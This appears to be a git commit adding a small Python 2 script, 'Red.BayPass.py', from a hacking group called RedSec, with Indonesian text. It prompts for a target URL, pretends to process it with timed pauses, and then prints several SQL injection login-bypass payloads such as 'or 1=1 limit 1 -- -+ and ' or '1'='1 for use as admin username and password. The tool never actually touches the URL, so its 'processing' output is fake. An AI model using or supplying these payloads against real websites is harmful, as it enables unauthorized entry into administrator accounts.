b2e54a08bc80f90b8a45e76b98109d11e30af95a
REDSEC <68374733+hjprihatini@users.noreply.github.com>
2022-03-12 21:17:05 +0700

    Add files via upload

---
+++ Red.BayPass.py
@@ -0,0 +1,53 @@
+#By RedSec
+#Yang Penting Jangan Recode Tod
+#CySec My Team
+
+import os
+import sys
+import time
+
+os.system("clear")
+os.system("figlet Red.ByPass")
+print("=========================")
+print("Create : RedSec")
+print("Team : CySec")
+print("Pesan : Yang Penting Web Vul Terhadap Pass Yang Gw Kasih")
+print("==========================")
+print
+Pilih = raw_input ('Url Target => ')
+print
+time.sleep(3)
+print("URL TARGET SEDANG DI PROSES")
+time.sleep(2)
+print("Selesai")
+print
+print("User : admin' #")
+print("Pass : admin' #")
+print
+time.sleep(1)
+print("User : 'or 1=1 limit 1 -- -+")
+print("pass : 'or 1=1 limit 1 -- -+")
+print
+time.sleep(1)
+print("User : ' or '1'='1")
+print("Pass : ' or '1'='1")
+print
+time.sleep(1)
+print("User : 'or''='")
+print("Pass : 'or''='")
+print
+time.sleep(1)
+print("User : 'or''='@gmail.com")
+print("Pass : 'or''='")
+print
+time.sleep(1)
+print("KALO JUGA GAK BISA BERARTI WEB ITU NOT VULN KARNA YANG GW PASS END USER") 
+print("YANG GE KASIH ITU ADALAH USER END PASS BYPASS")
+print("By RedSec")
+print
+os.system("exit")
+
+
+
+
+
